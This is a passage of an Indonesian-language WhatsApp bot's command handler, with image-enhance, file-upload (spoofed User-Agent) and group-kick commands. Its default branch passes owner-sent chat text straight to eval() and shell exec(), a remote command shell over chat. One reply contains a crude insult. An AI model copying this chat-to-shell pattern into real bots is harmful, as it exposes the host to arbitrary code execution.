if (!/image/.test(mime)) return reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
reply("Mohon Tunggu Sebentar...")
let media = await quoted.download()
let proses = await remini(media, "enhance");
AndraZyy.sendMessage(m.chat, { image: proses, caption: 'BERHASIL ENCHANTED ✅'}, { quoted: m})
}
break
case 'tourl': {
const FormData = require("form-data");
const { fromBuffer } = require("file-type");
const fakeUserAgent = require("fake-useragent");
const { filesize } = require('filesize');
	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || ''
	const createFormData = (content, fieldName, ext) => {
 const { mime } = fromBuffer(content) || {};
 const formData = new FormData();
 formData.append(fieldName, content, `${new Date()}.${ext}`);
 return formData;
};

const catbox = async (content) => {
 try {
 /*
 @ CatBox Uploader
 $ Create by Syaii
 */
 const { ext, mime } = (await fromBuffer(content)) || {};
 const formData = createFormData(content, "fileToUpload", ext);
 formData.append("reqtype", "fileupload");
 const response = await fetch("https://catbox.moe/user/api.php", {
 method: "POST",
 body: formData,
 headers: {
 "User-Agent": fakeUserAgent(),
 },
 });
 return await response.text();
 } catch (error) {
 throw false;
 }
 }
	if (!mime) return reply('reply media!')
	reply("Mohon Tunggu Sebentar...")
	let media = await q.download()
	let link = await catbox(media)
	let size = await fetch(link)
	size = await size.text()
	size = await filesize(size.length)
	let caption = `*SUCCES UPLOAD A FILE*

📊 *S I Z E :* ${size} Byte
🔗 *L I N K :* ${link} !
`
await AndraZyy.sendMessage(m.chat,{image: {url: link}, caption: caption }, { quoted: qtext2 })
}
break

case "kick": case "kik": {
if (!m.isGroup) return reply("Only Group")
if (!isCreator && !m.isAdmins) return reply("Only Owner!")
if (!m.isBotAdmins) return Reply("Blum Admin Kontol")
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await AndraZyy.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await AndraZyy.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == AndraZyy) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})